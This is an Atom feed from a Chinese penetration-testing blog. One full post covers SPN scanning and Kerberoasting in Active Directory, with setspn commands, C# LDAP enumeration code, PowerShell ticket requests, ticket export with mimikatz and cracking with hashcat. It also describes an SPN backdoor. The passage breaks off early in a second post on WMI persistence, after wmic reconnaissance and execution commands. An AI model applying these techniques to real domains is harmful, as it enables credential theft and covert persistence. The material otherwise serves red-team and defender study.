<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RcoIl的窝</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rcoil.me/"/>
  <updated>2019-06-10T10:19:53.804Z</updated>
  <id>https://rcoil.me/</id>
  
  <author>
    <name>RcoIl</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【域渗透】 SPN 扫描利用</title>
    <link href="https://rcoil.me/2019/06/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%20SPN%20%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8/"/>
    <id>https://rcoil.me/2019/06/【域渗透】 SPN 扫描利用/</id>
    <published>2019-06-10T10:52:59.000Z</published>
    <updated>2019-06-10T10:19:53.804Z</updated>
    
    <content type="html"><![CDATA[<p><code>Kerberos</code> 与 <code>SPN</code>。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在内网渗透的信息收集中，机器服务探测一般都是通过端口扫描去做的，但是有些环境不允许这些操作。通过利用 SPN 扫描可快速定位开启了关键服务的机器，这样就不需要去扫对应服务的端口，有效规避端口扫描动作。</p><p><code>Kerberoasting</code> 是域渗透中经常使用的一项技术，是通过爆破 <code>TGS-REP</code> 实现。</p><h2 id="0x01-关于-SPN"><a href="#0x01-关于-SPN" class="headerlink" title="0x01 关于 SPN"></a>0x01 关于 <code>SPN</code></h2><p>服务主体名称（<code>SPN: Service Principal Names</code>）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。</p><p>如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 <code>SPN</code>。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 <code>SPN</code>。<code>SPN</code> 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机名称或别名注册 <code>SPN</code>。</p><p>如果用一句话来说明的话就是如果想使用 <code>Kerberos</code> 协议来认证服务，那么必须正确配置 <code>SPN</code>。</p><p>SPN 可以分为两种：</p><ul><li>注册在域内机器账户（<code>Computers</code>）上</li><li>注册在域内用户账户（<code>Users</code>）下</li></ul><h2 id="0x02-SPN-标准格式"><a href="#0x02-SPN-标准格式" class="headerlink" title="0x02 SPN 标准格式"></a>0x02 <code>SPN</code> 标准格式</h2><p>在 SPN 语法中存在 4 种元素，两个必须元素和两个格外元素。其中 <code>&lt;service class&gt;</code> 和 <code>&lt;host&gt;</code> 为必需元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;service class&gt;/&lt;host&gt;:&lt;port&gt; &lt;servername&gt;</span><br><span class="line">服务类型/对应机器名:服务端口[默认端口可不写]</span><br><span class="line">MSSQLSvc/SQLServer.rcoil.me:1433</span><br></pre></td></tr></table></figure><h2 id="0x03-使用-SetSPN-为机器-域用户-创建-SPN"><a href="#0x03-使用-SetSPN-为机器-域用户-创建-SPN" class="headerlink" title="0x03 使用 SetSPN 为机器(域用户)创建 SPN"></a>0x03 使用 <code>SetSPN</code> 为机器(域用户)创建 <code>SPN</code></h2><p>命令语法类似如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn -S http/&lt;computername&gt;.&lt;domainname&gt; &lt;domain-user-account&gt;</span><br></pre></td></tr></table></figure><p><code>-S</code> 参数：验证不存在重复项后，添加随意 <code>SPN</code>。<strong>注意：</strong> <code>-S</code> 从 <code>Windows Server 2008</code> 开始系统默认提供。</p><p>此处以 Web 服务器为例。</p><ul><li>以 <code>web 用户</code> 运行 <code>Web 服务器</code></li><li>域管理员权限运行 <code>cmd</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Setspn -s http/WebDemo_PC.rcoil.me rcoil\web</span><br><span class="line">Setspn -s http/WebDemo_PC.rcoil.me WebDemo_PC$</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-06_15-41-04.png" alt="Snipaste_2019-06-06_15-41-04"></p><h2 id="0x04-借助-SetSPN-对域内相关服务进行查询"><a href="#0x04-借助-SetSPN-对域内相关服务进行查询" class="headerlink" title="0x04 借助 SetSPN 对域内相关服务进行查询"></a>0x04 借助 <code>SetSPN</code> 对域内相关服务进行查询</h2><h3 id="4-1、查询域内-MSSQL-数据库服务器"><a href="#4-1、查询域内-MSSQL-数据库服务器" class="headerlink" title="4.1、查询域内 MSSQL 数据库服务器"></a>4.1、查询域内 <code>MSSQL</code> 数据库服务器</h3><p><em>使用第 3 点中的对照表快速查询</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T rcoil.me -Q */* | findstr &quot;MSSQLSvc&quot;</span><br></pre></td></tr></table></figure><h3 id="4-2、相关查询-C-源码"><a href="#4-2、相关查询-C-源码" class="headerlink" title="4.2、相关查询 C# 源码"></a>4.2、相关查询 <code>C# 源码</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.DirectoryServices;</span><br><span class="line">using System.DirectoryServices.ActiveDirectory;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line">namespace SPNSearcher</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Domain CurrentDomain = Domain.GetCurrentDomain();</span><br><span class="line">            DirectoryEntry rootEntry = new DirectoryEntry(&quot;LDAP://rootDSE&quot;);</span><br><span class="line">            string RootDSE = (string)rootEntry.Properties[&quot;defaultNamingContext&quot;].Value;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(&quot;[*] Current Domain: &quot;+ CurrentDomain);</span><br><span class="line">            GetSPNInfor(RootDSE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /// &lt;summary&gt;</span><br><span class="line">        /// 通过 SPN 扫描获取域中基于主机的 MSSQL、Exchange 等服务</span><br><span class="line">        /// &lt;/summary&gt;</span><br><span class="line">        /// ADSearcherSPNTypes = &quot;ADAM&quot;,&quot;AGPM&quot;,&quot;bo&quot;,&quot;CESREMOTE&quot;,&quot;Dfs&quot;,&quot;DNS&quot;,&quot;Exchange&quot;,&quot;FIMService&quot;,&quot;ftp&quot;,&quot;http&quot;,&quot;IMAP&quot;,&quot;ipp&quot;,&quot;iSCSITarget&quot;,&quot;kadmin&quot;,&quot;ldap&quot;,&quot;MS&quot;,&quot;sql&quot;,&quot;nfs&quot;,&quot;secshd&quot;,&quot;sip&quot;,&quot;SMTP&quot;,&quot;SoftGrid&quot;,&quot;TERMSRV&quot;,&quot;Virtual&quot;,&quot;vmrc&quot;,&quot;vnc&quot;,&quot;vpn&quot;,&quot;vssrvc&quot;,&quot;WSMAN&quot;,&quot;xmpp&quot;</span><br><span class="line">        /// &lt;param name=&quot;RootDSE&quot;&gt;Current forest.&lt;/param&gt;</span><br><span class="line">        public static void GetSPNInfor(string RootDSE)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(&quot;[*] Current Domian SPN Information:&quot;);</span><br><span class="line"></span><br><span class="line">            DirectoryEntry gcEntry = new DirectoryEntry(&quot;GC://&quot; + RootDSE);</span><br><span class="line"></span><br><span class="line">            List&lt;string&gt; Supersedence = new List&lt;string&gt;();</span><br><span class="line">            Supersedence.AddRange(new string[]</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;SQL:*MSSQL*:SQL Server 数据库&quot;,</span><br><span class="line">                &quot;Exchange:*exchange*:Exchange 相关服务&quot;,</span><br><span class="line">                &quot;DNS:*DNS*:DNS 服务&quot;,</span><br><span class="line">                &quot;SQL:*MySql*:MySql 数据库&quot;,</span><br><span class="line">                &quot;Oracle:*Oracle*:Oracle 数据库&quot;,</span><br><span class="line">                &quot;postgres:*postgres*:Postgres 数据库&quot;,</span><br><span class="line">                &quot;HTTPS:*HTTPS*:HTTPS Web 服务&quot;,</span><br><span class="line">                &quot;HTTP:*HTTP*:HTTP Web 服务&quot;,</span><br><span class="line">                &quot;VPN:*VPN*:VPN 远程接入服务&quot;,</span><br><span class="line">                &quot;VNC:*VNC*:VNC 服务&quot;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            foreach (string SPNServiceFilter in Supersedence)</span><br><span class="line">            &#123;</span><br><span class="line">                string[] sArray = Regex.Split(SPNServiceFilter, &quot;:&quot;, RegexOptions.IgnoreCase);</span><br><span class="line">                string ContainsInfo = sArray[0].ToString();</span><br><span class="line">                string ADSearcherSPNTypes = sArray[1].ToString();</span><br><span class="line">                string SPNService = sArray[2].ToString();</span><br><span class="line"></span><br><span class="line">                using (gcEntry)</span><br><span class="line">                &#123;</span><br><span class="line">                    DirectorySearcher spnSearch = new DirectorySearcher(gcEntry, &quot;(&amp;(objectClass=user)(servicePrincipalName=&quot; + ADSearcherSPNTypes + &quot;))&quot;);</span><br><span class="line"></span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">                    Console.WriteLine(&quot;  [+] SPN service: &quot; + SPNService);</span><br><span class="line"></span><br><span class="line">                    foreach (SearchResult sr in spnSearch.FindAll())</span><br><span class="line">                    &#123;</span><br><span class="line">                        var SPNs = sr.Properties[&quot;servicePrincipalName&quot;];</span><br><span class="line"></span><br><span class="line">                        if (SPNs.Count &gt; 1)</span><br><span class="line">                        &#123;</span><br><span class="line">                            foreach (string spn in SPNs)</span><br><span class="line">                            &#123;</span><br><span class="line">                                if (spn.Contains(ContainsInfo))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    Console.WriteLine(&quot;    [&gt;] SAM Account Name: &#123;0&#125;&quot;, sr.Properties[&quot;sAMAccountName&quot;][0]);</span><br><span class="line">                                    Console.WriteLine(&quot;    [&gt;] &quot; + spn);</span><br><span class="line">                                    break;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        else</span><br><span class="line">                        &#123;</span><br><span class="line">                            Console.WriteLine(&quot;    [&gt;] &quot; + SPNs[0]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自行添加需要的服务即可，更多的服务写在了备注中。</p><h3 id="4-3、相关原理说明"><a href="#4-3、相关原理说明" class="headerlink" title="4.3、相关原理说明"></a>4.3、相关原理说明</h3><p>在 SPN 扫描时我们可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容</p><p><code>LDAP 协议</code>全称是 <code>Lightweight Directory Access Protocol</code>，一般翻译都是翻译成 <strong>轻量目录访问协议</strong>。通俗点可以把 <code>LDAP 协议</code>理解为一个关系型数据库，其中存储了域内主机的各种配置信息。</p><p>在域控中默认安装有 <code>ADSI 编辑器</code>，它是 <code>LDAP</code> 的编辑器，可以通过在域控中运行 <code>adsiedit.msc</code> 来打开。</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_10-43-30.png" alt="Snipaste_2019-06-10_10-43-30"></p><p>我们的 <code>SPN 查询</code>，实际上就是就是查询 <code>LDAP</code> 中存储的内容。（以后会通过别的章节详细介绍 <code>LDAP 协议</code>）</p><p>下图是 <code>4.2</code> 中 <code>MSSQL 查询</code>的结果，协议为 <code>LDAP</code>。</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_10-19-38.png" alt="Snipaste_2019-06-10_10-19-38"></p><h3 id="4-4、更多扫描工具"><a href="#4-4、更多扫描工具" class="headerlink" title="4.4、更多扫描工具"></a>4.4、更多扫描工具</h3><p>扫描工具有很多，但是只要知道原理就不会觉得太难。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Discover-PAMSSQLServers(Powershell-AD-Recon)</span><br><span class="line">GetUserSPNs(Powershell、vbs、Python)</span><br><span class="line">PowerView(Powershell)</span><br><span class="line">SetSPN(exe)</span><br></pre></td></tr></table></figure><h2 id="0x05-获取当前目标域中所有以域用户身份起服务的-SPN"><a href="#0x05-获取当前目标域中所有以域用户身份起服务的-SPN" class="headerlink" title="0x05 获取当前目标域中所有以域用户身份起服务的 SPN"></a>0x05 获取当前目标域中所有以域用户身份起服务的 SPN</h2><p>查询以域用户身份起的服务，主要是为了后续 <code>Kerberoast</code>做准备。</p><ul><li>现成工具</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe GetUserSPNs.vbs</span><br><span class="line">powerview --&gt; Get-NetUser -SPN</span><br></pre></td></tr></table></figure><ul><li><code>C# 代码</code>（其实就是查询LDAP）：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public static void GetUserSPN(string RootDSE)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(&quot;[*] Current Domian SPN Information:&quot;);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            DirectoryEntry gcEntry = new DirectoryEntry(&quot;GC://&quot; + RootDSE);</span><br><span class="line">            </span><br><span class="line">            string querySPN = @&quot;(&amp;(!objectClass=computer)(servicePrincipalName=*))&quot;;</span><br><span class="line">            using (gcEntry)</span><br><span class="line">            &#123;</span><br><span class="line">                DirectorySearcher mssqlSearch = new DirectorySearcher(gcEntry, querySPN);</span><br><span class="line"></span><br><span class="line">                foreach (SearchResult sr in mssqlSearch.FindAll())</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;    [&gt;] SamAccountName: &#123;0&#125;&quot;, sr.Properties[&quot;sAMAccountName&quot;][0]);</span><br><span class="line">                    Console.WriteLine(&quot;    [&gt;] DistinguishedName: &#123;0&#125;&quot;, sr.Properties[&quot;distinguishedName&quot;][0]);</span><br><span class="line">                    Console.WriteLine(&quot;    [&gt;] ServicePrincipalName: &#123;0&#125;&quot;, sr.Properties[&quot;servicePrincipalName&quot;][0]);</span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li><p>结果如下：</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_11-22-02.png" alt="Snipaste_2019-06-10_11-22-02"></p></li></ul><h2 id="0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><h3 id="6-1、申请-TGS"><a href="#6-1、申请-TGS" class="headerlink" title="6.1、申请 TGS"></a>6.1、申请 TGS</h3><ul><li><code>powershell</code></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt;<span class="built_in">Add-Type</span> -AssemblyName System.IdentityModel</span><br><span class="line">PS&gt;<span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">"HTTP/WebDemo_PC.rcoil.me"</span></span><br></pre></td></tr></table></figure><ul><li><code>C#</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public KerberosRequestorSecurityToken (string servicePrincipalName);</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">servicePrincipalName</span><br><span class="line">String</span><br><span class="line">KerberosRequestorSecurityToken 安全令牌的服务主体名称。 设置 ServicePrincipalName 属性。</span><br><span class="line">异常</span><br><span class="line">ArgumentNullException</span><br><span class="line">servicePrincipalName 为 null。</span><br><span class="line">SecurityTokenException</span><br><span class="line">无法为当前用户获取 Kerberos 票证。</span><br></pre></td></tr></table></figure><p>这一整个过程是通过 <code>AS-REQ、AS-REP、TGS-REQ、TGS-REP</code> 这四个认证流程，最终获取到 RC4方式的加密票据。</p><h3 id="6-2、获取-TGS-REP"><a href="#6-2、获取-TGS-REP" class="headerlink" title="6.2、获取 TGS-REP"></a>6.2、获取 TGS-REP</h3><p><code>Kerberos 协议</code>中请求的票据会保存在内存中，可以通过 <code>klist</code> 命令查看当前会话存储的 <code>kerberos</code> 票据。</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_15-17-14.png" alt="Snipaste_2019-06-10_15-17-14"></p><ul><li><p>使用 <code>mimikatz</code> 的 <code>kerberos::list /export</code> 导出。</p></li><li><p><code>SharpRost</code> （如今的Rubeus）</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_15-53-24.png" alt="Snipaste_2019-06-10_15-53-24"></p></li><li><p><code>Invoke-kerberoast</code> 的 <code>-outputformat</code> ，选择 hashcat 格式。</p></li><li><p>综合以上代码，新建项目，项目地址: <a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SPNSearcher" target="_blank" rel="noopener">SPNSearcher</a></p></li></ul><h3 id="6-3、爆破-TGS-REP"><a href="#6-3、爆破-TGS-REP" class="headerlink" title="6.3、爆破 TGS-REP"></a>6.3、爆破 TGS-REP</h3><p>此处爆破的是<code>HTTP/WebDemo_PC.rcoil.me</code></p><p>可选择工具（工具始终是工具，看的是字典强不强）:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py(kerberoast套装)</span><br><span class="line">hashcat(密码破解全能工具，kali自带)</span><br></pre></td></tr></table></figure></p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_15-35-24.png" alt="Snipaste_2019-06-10_15-35-24"></p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_15-46-01.png" alt="Snipaste_2019-06-10_15-46-01"></p><h2 id="0x07-Kerberoasting-的后门利用"><a href="#0x07-Kerberoasting-的后门利用" class="headerlink" title="0x07 Kerberoasting 的后门利用"></a>0x07 <code>Kerberoasting</code> 的后门利用</h2><p>在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 TGS ，经过破解后获得明文口令。</p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://docs.microsoft.com/zh-cn/sql/reporting-services/report-server/register-a-service-principal-name-spn-for-a-report-server?view=sql-server-2017" target="_blank" rel="noopener">为报表服务器注册服务主体名称 (SPN)</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken.-ctor?view=netframework-4.8" target="_blank" rel="noopener">KerberosRequestorSecurityToken(String)</a><br><a href="https://www.anquanke.com/post/id/161781#h3-8" target="_blank" rel="noopener">从 Kekeo 到 Rubeus</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">域渗透——Kerberoasting</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;Kerberos&lt;/code&gt; 与 &lt;code&gt;SPN&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>永久性 WMIC 事件订阅 - 权限维持（三）</title>
    <link href="https://rcoil.me/2019/05/%E6%B0%B8%E4%B9%85%E6%80%A7%20WMIC%20%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%20-%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://rcoil.me/2019/05/永久性 WMIC 事件订阅 - 权限维持（三）/</id>
    <published>2019-05-30T12:52:59.000Z</published>
    <updated>2019-05-31T08:16:16.781Z</updated>
    
    <content type="html"><![CDATA[<p>本文是针对<a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a>的第三次说明。</p><p>与之前的文章不同，这个操作需要管理员权限。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在日常中，使用 <code>WMI</code> 都是用于信息的收集，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list #获取补丁信息</span><br><span class="line">wmic startup list brief # 启动的程序</span><br><span class="line">wmic startup list full # 自启动的程序</span><br><span class="line">wmic process call create &quot;calc.exe&quot; # 在当前机器中执行指定程序</span><br><span class="line">wmic process where name=&apos;*.exe&apos; list full   #查询某个进程所对应某个具体的可执行程序是什么</span><br><span class="line">wmic process where(description=&quot;rundll32.exe&quot;) # 查看rundll32所加载的dll</span><br><span class="line">wmic cpu get DataWidth /format:list # 查询当前机器的操作系统位数</span><br><span class="line">wmic share  get name,path,status  #利用wmic查找共享</span><br><span class="line">wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size #查看分区</span><br></pre></td></tr></table></figure><p>但其实它的功能还有很多，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">防病毒检测</span><br><span class="line">代码执行</span><br><span class="line">横向移动</span><br><span class="line">持久化</span><br><span class="line">盗取数据</span><br></pre></td></tr></table></figure><p>这里就针对持久化进行说明 。</p><h2 id="0x01-查询-WMI"><a href="#0x01-查询-WMI" class="headerlink" title="0x01 查询 WMI"></a>0x01 查询 WMI</h2><p><code>WMI</code> 提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即 <code>WQL</code> （类似 SQL的查询语言）。WQL查询通常可以分为以下几类：</p><ul><li>Instance Queries（实例查询）：查询WMI对象实例。</li><li>Event Queries（事件查询）：等同于在WMI对象创建/修改/删除的时候注册一个消息。</li><li>Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。</li></ul><h3 id="1-1-Instance-Queries"><a href="#1-1-Instance-Queries" class="headerlink" title="1.1 Instance Queries"></a>1.1 Instance Queries</h3><p>这是最常用的WQL查询。基本的格式如下：<br><code>SELECT [Class property name | *] FROM [CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</code></p><ul><li>下面的查询语句将返回所有可执行文件名中带有 <code>chrome</code> 的正在运行的进程：<br><code>SELECT * FROM Win32_Process WHERE Name LIKE &quot;%chrome%&quot;</code></li></ul><h3 id="1-2-Event-Queries"><a href="#1-2-Event-Queries" class="headerlink" title="1.2 Event Queries"></a>1.2 Event Queries</h3><p>事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建/修改/删除的时候给用户发送一个消息。根据消息类型是 <code>intrinsic</code>（系统自带的）还是 <code>extrinsic</code>（第三方的），查询语句格式不同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] &lt;WHERE [CONSTRAINT]&gt;</span><br><span class="line"></span><br><span class="line">SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</span><br></pre></td></tr></table></figure><ul><li><p>用于登陆时都会触发此事件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA &apos;Win32_LogonSession&apos; AND TargetInstance.LogonType=2</span><br></pre></td></tr></table></figure></li><li><p>每次用户在插入可移除设备时都会触发此事件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Win32_VolumeChangeEvent Where EventType=2</span><br></pre></td></tr></table></figure></li><li><p>每次创建 win32 进程时都会触发此事件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * From __InstanceCreationEvent Where TargetInstance Isa &quot;Win32_Process&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="1-3-Meta-Queries"><a href="#1-3-Meta-Queries" class="headerlink" title="1.3 Meta Queries"></a>1.3 Meta Queries</h3><p>元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。</p><ul><li><p>格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</span><br></pre></td></tr></table></figure></li><li><p>下面这个语句会查询所有以 <code>WIN32</code> 开头的WMI的类：<br><code>SELECT * FROM Meta_Class WHERE __CLASS LIKE &quot;Win32%&quot;</code></p></li><li>下面这个语句会查询某个命名空间下的所有命名空间：<br><code>SELECT Name FROM __NAMESPACE</code></li></ul><p>注意，当不显示的指定命名空间时，默认的命名空间为<code>ROOT\CIMV2</code>。</p><h2 id="0x02-与WMI交互"><a href="#0x02-与WMI交互" class="headerlink" title="0x02 与WMI交互"></a>0x02 与WMI交互</h2><p>Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。</p><p>下面是部分工具的一个不完全的列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、PowerShell</span><br><span 